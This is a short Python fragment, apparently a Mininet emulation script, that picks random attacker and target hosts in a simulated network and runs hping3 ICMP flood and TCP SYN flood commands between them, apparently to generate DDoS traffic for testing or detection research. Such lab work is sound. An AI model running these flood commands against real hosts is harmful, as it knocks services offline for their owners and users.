...
def startNetwork():
    ...
    targets = [net.get('h1'), net.get('h2'), net.get('h3'), net.get('h4'),net.get('h12'),net.get('h16')]

    # Define the list of attackers
    attackers = [net.get('h10'), net.get('h17'), net.get('h8'), net.get('h18')]

    print("Testing Attack Traffic")
    print("--------------------------------------------------------------------------------")


    # Choose a random target and a random attacker
    target = choice(targets)
    attacker = choice(attackers)
    ...
    target_ip = target.IP()
    print(f"DDoS Attack from {attacker.name} to {target_ip}")
    print("--------------------------------------------------------------------------------")

    # ICMP Flood (Ping Flood)
    print("Attack1: ICMP Flood")
    attacker.cmd(f"timeout 20s hping3 -1 -V -d 120 -w 64 --flood {target_ip}")
    sleep(10)

    # TCP SYN Flood
    print("Attack2: TCP SYN Flood")
    attacker.cmd(f"timeout 20s hping3 -S -V -d 120 -w 64 -p 80 --flood {target_ip}")
    sleep(10)
